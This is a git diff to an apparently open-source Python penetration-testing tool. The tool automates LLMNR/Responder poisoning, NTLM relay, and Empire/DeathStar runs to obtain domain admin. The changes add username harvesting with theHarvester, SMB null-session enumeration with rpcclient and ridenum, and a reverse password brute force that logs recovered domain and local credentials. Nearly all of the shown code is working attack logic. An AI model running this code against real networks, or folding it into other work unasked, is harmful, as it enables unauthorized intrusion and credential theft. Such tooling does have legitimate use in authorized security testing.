@@ -37,6 +37,7 @@ def parse_args():
     parser.add_argument("-t", "--time", default='10', help="Number of minutes to run the LLMNR/Responder attack; defaults to 10m")
     parser.add_argument("-i", "--interface", help="Interface to use with Responder")
     parser.add_argument("-c", "--command", help="Remote command to run upon successful NTLM relay")
+    parser.add_argument("-d", "--domain", help="Domain to use with theHarvester to gather usernames for reverse bruteforce, e.g., google.com")
     parser.add_argument("--auto", action="store_true", help="Start up Empire and DeathStar to automatically get domain admin")
     return parser.parse_args()
 
@@ -300,6 +301,62 @@ def get_hosts(args, report):
 
     return hosts
 
+#def coros_pool(worker_count, commands):
+#    '''
+#    A pool without a pool library
+#    '''
+#    coros = []
+#    if len(commands) > 0:
+#        while len(commands) > 0:
+#            for i in range(worker_count):
+#                # Prevents crash if [commands] isn't divisible by worker count
+#                if len(commands) > 0:
+#                    cmd = commands.pop()
+#                    coros.append(get_output(cmd))
+#                else:
+#                    return coros
+#    return coros
+
+@asyncio.coroutine
+def get_output(cmd):
+    '''
+    Performs async OS commands
+    '''
+    p = yield from asyncio.create_subprocess_shell(cmd, stdout=PIPE, stderr=PIPE)
+    # Output returns in byte string so we decode to utf8
+    out = (yield from p.communicate())[0].decode('utf8')
+    return out
+
+def async_get_outputs(loop, commands):
+    '''
+    Asynchronously run commands and get get their output in a list
+    Runs commands in a pool of 10 workers
+    '''
+    output = []
+    coros = []
+
+    if len(commands) == 0:
+        return output
+
+    # Get commands output in parallel
+    worker_count = len(commands)
+    if worker_count > 10:
+        worker_count = 10
+
+    # Pool of 10 workers
+    if len(commands) > 0:
+        while len(commands) > 0:
+            for i in range(worker_count):
+                # Prevents crash if [commands] isn't divisible by worker count
+                if len(commands) > 0:
+                    cmd = commands.pop()
+                    coros.append(get_output(cmd))
+
+            # Curiously, tons of the output is None here even though its never None in get_output(cmd)
+            output += loop.run_until_complete(asyncio.gather(*coros))
+
+    return output
+
 def coros_pool(worker_count, commands):
     '''
     A pool without a pool library
@@ -312,41 +369,6 @@ def coros_pool(worker_count, commands):
                 if len(commands) > 0:
                     cmd = commands.pop()
                     coros.append(get_output(cmd))
-                else:
-                    return coros
-    return coros
-
-@asyncio.coroutine
-def get_output(cmd):
-    '''
-    Performs async OS commands
-    '''
-    p = yield from asyncio.create_subprocess_shell(cmd, stdout=PIPE, stderr=PIPE)
-    # Output returns in byte string so we decode to utf8
-    return (yield from p.communicate())[0].decode('utf8')
-
-def async_get_outputs(loop, commands):
-    '''
-    Asynchronously run commands and get get their output in a list
-    '''
-    output = []
-
-    if len(commands) == 0:
-        return output
-
-    # Get commands output in parallel
-    worker_count = len(commands)
-    if worker_count > 10:
-        worker_count = 10
-
-    # Create pool of coroutines
-    coros = coros_pool(worker_count, commands)
-
-    # Run the pool of coroutines
-    if len(coros) > 0:
-        output += loop.run_until_complete(asyncio.gather(*coros))
-
-    return output
 
 def create_cmds(hosts, cmd):
     '''
@@ -397,7 +419,7 @@ def get_AD_domains(null_sess_hosts):
 
     if len(uniq_doms) > 0:
         for d in uniq_doms:
-            print_good('Domain found: ' + d) 
+            print_good('Domain found: ' + d)
 
     return uniq_doms
 
@@ -514,19 +536,27 @@ def parse_brute_output(brute_output, prev_creds):
     pw_found = False
 
     for line in brute_output:
-        # Missing second line of output means we have a hit
-        if len(line.splitlines()) == 1:
-            pw_found = True
-            split = line.split()
-            ip = split[1]
-            dom_user_pwd = split[5].replace('"','').replace('%',':')
-            prev_creds.append(dom_user_pwd)
-            host_dom_user_pwd = ip+'\\'+dom_user_pwd
+        # gathering the coroutines leads to tons of None in output
+        if line:
+            # Missing second line of output means we have a hit
+            if len(line.splitlines()) == 1:
+                pw_found = True
+                split = line.split()
+                ip = split[1]
+                dom_user_pwd = split[5].replace('"','').replace('%',':')
+                if dom_user_pwd not in prev_creds:
+                    prev_creds.append(dom_user_pwd)
+                host_dom_user_pwd = ip+' - '+dom_user_pwd
 
-            duplicate = check_found_passwords(dom_user_pwd)
-            if duplicate == False:
-                print_great('Password found! '+dom_user_pwd)
-                log_pwds([dom_user_pwd])
+                duplicate = check_found_passwords(dom_user_pwd)
+                if duplicate == False:
+                    # if its an AD account just print the AD creds
+                    if '\\' in dom_user_pwd:
+                        print_great('Password found! '+dom_user_pwd)
+                    # if it's a local account then print the IP and creds
+                    else:
+                        print_great('Password found! '+host_dom_user_pwd)
+                    log_pwds([host_dom_user_pwd])
 
     if pw_found == False:
         print_bad('No reverse bruteforce password matches found')
@@ -539,6 +569,8 @@ def smb_reverse_brute(loop, hosts, args, passwords, prev_creds, prev_users):
     '''
     # {ip:'domain name: xxx', 'domain sid: xxx'}
     null_sess_hosts = {}
+    ip_users = {}
+    domains = []
     dom_cmd = 'rpcclient -U "" {} -N -c "lsaquery"'
     dom_cmds = create_cmds(hosts, dom_cmd)
 
@@ -548,52 +580,95 @@ def smb_reverse_brute(loop, hosts, args, passwords, prev_creds, prev_users):
     print_info('Example command that will run: '+dom_cmds[0].split('&& ')[1])
 
     rpc_output = async_get_outputs(loop, dom_cmds)
-    if rpc_output == None:
-        print_bad('Error attempting to look up null SMB sessions')
-        return
+    if rpc_output:
 
-    # {ip:'domain_name', 'domain_sid'}
-    chunk_null_sess_hosts = get_null_sess_hosts(rpc_output)
+        # {ip:'domain_name', 'domain_sid'}
+        null_sess_hosts = get_null_sess_hosts(rpc_output) #1111 why is this chunk and not just null_sess_hosts
 
-    # Create master list of null session hosts
-    null_sess_hosts.update(chunk_null_sess_hosts)
-    if len(null_sess_hosts) == 0:
-        print_bad('No null SMB sessions available')
-        return prev_creds, prev_users, None
-    else:
-        null_hosts = []
-        for ip in null_sess_hosts:
-            print_good('Null session found: {}'.format(ip))
-            null_hosts.append(ip)
+        # Create master list of null session hosts
+        #null_sess_hosts.update(chunk_null_sess_hosts)
+        if len(null_sess_hosts) == 0:
+            print_bad('No null SMB sessions available')
+        else:
+            null_hosts = []
+            for ip in null_sess_hosts:
+                print_good('Null session found: {}'.format(ip))
+                null_hosts.append(ip)
 
-    domains = get_AD_domains(null_sess_hosts)
+            domains = get_AD_domains(null_sess_hosts)
 
-    # Gather usernames using ridenum.py
-    print_info('Checking for usernames. This may take a bit...')
-    ridenum_cmd = 'python2 submodules/ridenum/ridenum.py {} 500 50000 | tee -a logs/ridenum.log'
-    ridenum_cmds = create_cmds(null_hosts, ridenum_cmd)
-    print_info('Example command that will run: '+ridenum_cmds[0].split('&& ')[1])
-    ridenum_output = async_get_outputs(loop, ridenum_cmds)
-    if len(ridenum_output) == 0:
-        print_bad('No usernames found')
-        return
+            # Gather usernames using ridenum.py
+            print_info('Checking for usernames. This may take a bit...')
+            ridenum_cmd = 'python2 submodules/ridenum/ridenum.py {} 500 50000 | tee -a logs/ridenum.log'
+            ridenum_cmds = create_cmds(null_hosts, ridenum_cmd)
+            print_info('Example command that will run: '+ridenum_cmds[0].split('&& ')[1])
+            ridenum_output = async_get_outputs(loop, ridenum_cmds)
 
-    # {ip:[username, username2], ip2:[username, username2]}
-    ip_users, prev_users = get_usernames(ridenum_output, prev_users)
+            # ip_users = {ip:[username, username2], ip2:[username, username2]}
+            ip_users, prev_users = get_usernames(ridenum_output, prev_users)
+            if len(ip_users) == 0:
+                print_bad('No usernames found through null SMB session')
 
-    # Creates a list of unique commands which only tests
-    # each username/password combo 2 times and not more
-    brute_cmds = create_brute_cmds(ip_users, passwords)
-    if args.password_list:
-        print_info('Checking the passwords in {} against the users'.format(args.password_list))
-    else:
-        print_info('Checking the passwords {} and {} against the users'.format(passwords[0], passwords[1]))
+    # Do theHarvester for username collection
+    if args.domain:
+        ip_users, prev_users = run_theHarvester(ip_users, prev_users, null_sess_hosts, args.domain, hosts[0].address)
 
-    brute_output = async_get_outputs(loop, brute_cmds)
+    if len(ip_users) > 0:
+        # Creates a list of unique commands which only tests
+        # each username/password combo 2 times and not more
+        brute_cmds = create_brute_cmds(ip_users, passwords)
+        if args.password_list:
+            print_info('Checking the passwords in {} against the users'.format(args.password_list))
+        else:
+            print_info('Checking the passwords {} and {} against the users'.format(passwords[0], passwords[1]))
 
-    prev_creds = parse_brute_output(brute_output, prev_creds)
+        brute_output = async_get_outputs(loop, brute_cmds)
+
+        prev_creds = parse_brute_output(brute_output, prev_creds)
 
     return prev_creds, prev_users, domains
+
+def run_theHarvester(ip_users, prev_users, null_sess_hosts, domain, host):
+    '''
+    Run theHarvester to collect more potential usernames
+    domain is args.domain and domains are the domains found by ridenum
+    If null sessions were found and AD domains identified, then we brute
+    against those null session IPs
+    If no domains were ID'd, we test each username against one host
+    '''
+    users = []
+    cmd = 'python2 submodules/theHarvester/theHarvester.py -d {} -b all'.format(domain)
+    proc = run_proc(cmd)
+
+    with open('logs/theHarvester.py.log', 'r') as f:
+        lines = f.readlines()
+
+    for l in lines:
+        if '@' in l and 'cmartorella@edge-security.com' not in l:
+
+            user = l.split('@')[0]
+            if user not in prev_users:
+                prev_users.append(user)
+
+            # If we have AD domains found, use them so user = DOM\user
+            if len(null_sess_hosts) > 0:
+                for key,val in null_sess_hosts.items():
+                    ip = key
+                    dom = val[0]
+                    dom_user = dom+'\\'+user
+                    if ip_users.get(ip):
+                        ip_users[ip].append(dom_user)
+                    else:
+                        ip_users[ip] = [dom_user]
+            # No AD domains found, just use username
+            else:
+                if ip_users.get(host):
+                    ip_users[host].append(user)
+                else:
+                    ip_users[host] = [user]
+
+    return ip_users, prev_users
+
 
 def log_pwds(host_user_pwds):
     '''
@@ -1342,6 +1417,6 @@ if __name__ == "__main__":
     main(report, args)
 
 # Todo
-# give it agent detection so it can try using icebreaker user if fail
-# add more common passwords for rev bruteforce Password1, <previousseason><year>
+# give it agent detection so it can try using icebreaker user if fail?
+# how to make it not open so many files when doing async subprocess and coros pool?
 
